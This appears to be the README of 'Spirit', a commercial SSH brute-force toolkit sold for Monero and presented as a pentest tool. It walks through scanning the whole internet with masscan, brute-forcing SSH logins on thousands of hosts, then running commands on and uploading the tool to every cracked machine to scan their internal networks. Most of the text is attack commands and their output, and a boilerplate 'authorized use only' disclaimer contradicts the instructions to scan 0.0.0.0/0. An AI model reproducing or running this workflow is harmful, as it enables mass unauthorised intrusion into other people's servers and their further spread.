# Spirit - Network Pentest Tools

### [Download the latest Spirit release](https://github.com/theaog/spirit/releases)
```bash
$ wget https://github.com/theaog/spirit/releases/download/1.30/spirit.tgz
$ curl -OL https://github.com/theaog/spirit/releases/download/1.30/spirit.tgz
```
> NOTE: Plenty of fake Spirit clones are being distributed, make sure to verify you're running the original by checksum: `$ sha256sum -c spirit.sum`

> [`$ ./spirit --help`](./HELP) shows you all the included tools. \
Most commands have subcommands `./spirit <command> --help`

## Demo
[![asciicast](https://asciinema.org/a/645079.svg)](https://asciinema.org/a/645079?autoplay=true&loop=true)

## Quick Start
```bash
# download spirit
wget https://github.com/theaog/spirit/releases/download/1.30/spirit.tgz
# unpack spirit
tar xvf spirit.tgz
./spirit --help

# install masscan
sudo apt install masscan
# copy masscan into your current working directory
cp `which masscan` .

# start the show! <class-A> <port1,port2,port3> <speed> 
# ./spirit ports generates 3 random ports 1-65535 and keeps track of
# already generated port numbers in ports.lst
./go.sh 172 $(./spirit ports) 50000
```

## Help us spread the word about Spirit!
Refer Spirit in your community or work environment and earn up to 30% in Referral Fees.
Start here: `$ ./spirit partner`
Generate your Referral Code which grants 10% discount on any Spirit plan.

## Upgrade Spirit automaticaly
```bash
./spirit upgrade
Upgrading 87% [========================>     ] (5.9/5.9 MB, 49.652 MB/s)
```

## Support
- [GitHub Issue](https://github.com/theaog/spirit/issues/new)
- [Telegram](https://t.me/pentestspirit)

## Example usage for SSH brute flow TLDR;
```bash
# First scan your network or the internet (check disclaimer) to acquire a list of open ports.
$ masscan \
    --rate="50000" \
    --ports "22,222,2222,2212" 0.0.0.0/0 \
    --exclude 255.255.255.255 \
    -oG open.lst
Scanning 4294967295 hosts [4 ports/host]
# masscan will create an open.lst file in oG (output Greppable) format.

# Parse this open.lst to format the data, so that spirit can understand it.
$ ./spirit parse
INFO created h.lst in HOST:PORT format

# Optional: create a filter.lst file if you want to skip certain SSH versions.
$ cat >filter.lst<< EOF
SSH-1.0
SSH-2.0-CISCO
SSH-2.0-Comware
EOF

# Grab SSH banners to make sure your target version is running on the host. NOTE: Makes a backup of h.lst to h.lst.bak
$ ./spirit banner
INFO backing up h.lst to h.lst.bak
SSH-2.0-OpenSSH_8.2p  13% [=>                  ] [11s:1m15s]
INFO created h.lst in HOST:PORT:BANNER format
head -n1 h.lst
100.100.100.100:2222:SSH-2.0-OpenSSH_6.6.1

# Add a password list, spirit will automatically load user:pass from a p.lst file.
# NOTE: if p.lst is not present, Spirit uses an internal passfile
$ cat > p.lst << EOF
user1:pass1
user1:pass2
user2:pass50
EOF

# Start bruting...
$ ./spirit brute
INFO loaded h.lst with 26803 hosts
INFO loaded p.lst with 4881 logins
[2478/4653]root:!1qwerty [77]found [33]blocked [1284]threads 20% [====>               ] [20s:1h13m36s]
failed connections statistics:
(    7)  ssh: closed network connection 30s timeout
(    7)  total failed
results stored in:
- found.ssh # for quick manual connect
- found.login # user:pass combinations that worked
- found.lst # used by `spirit auto-ssh` for connecting en-masse
[26803]hosts [4000]bruted [3000]found [19803]blocked

# Connect to all your found hosts automatically & run commands.
$ ./spirit auto-ssh --command 'whoami && uptime'
# Upload spirit to all hosts and scan the LAN
$ ./spirit auto-ssh --upload ./spirit --command '/tmp/spirit scan --lan'
```

## Spirit is Free (sorta)
Scanning port 22 is unlimited, any other port requires a license.

## You can unlock Spirit's full functionality directly from the CLI by obtaining a license.
```bash
$ ./spirit buy
Monero only, you can convert other crypto assets to XMR on https://tradeogre.com
If you have any issue w/ the payment-flow, contact us https://github.com/theaog/spirit/issues
? Select your Spirit version::
  ▸ Basic TRIAL $10 (3 days) [1 Server]
    Basic $100 (30 days) [3 Servers]
    Pro $200 (30 days) [7 Servers]
    Ultra $500 (30 days) [15 Servers]
    Referral code
```

# Support our development
## Monero (XMR) thank you! (our favorite)
`895LJnKcfTv7NHf7SN1zz5UzhBRwwvdR8NYLvXNr54jJ3GXghBoyfBKLp2dL4GcYohQatRnigct8zgK6utkjjeBxVNsky1s`

![xmrqr](asset/xmrqr.png)

## Bitcoin (BTC) thank you too!
`bc1q7plm79dgllrhrjz772x4vjrtvu9yy03738psy5`

## Get Help & Support
Open a Github [issue](https://github.com/theaog/spirit/issues) and consider encrypting your message using this pub key [aog.gpg](asset/aog.gpg).

Don't forget to give us a Star!

> NOTICE: rumors have been circulating that `spirit` contains a backdoor -- that's not true, we would never do that. We offer a bounty of 50XMR to whomever opens an issue in this repo and provides undeniable proof of the "alleged" backdoor.

Spirit is clean software the only data it sends home is your machine-id to verify the license.

# Disclaimer

This tool should be used for authorized penetration testing and/or educational purposes only.
Any misuse of this software will not be the responsibility of the author or of any other collaborator.
Use it on your own systems and/or with the system owner's permission.

Usage of any tools in this repository for attacking targets without prior mutual consent is illegal.
It is the end user’s responsibility to obey all applicable local, state and federal laws.
We assume no liability and are not responsible for any misuse or damage caused.
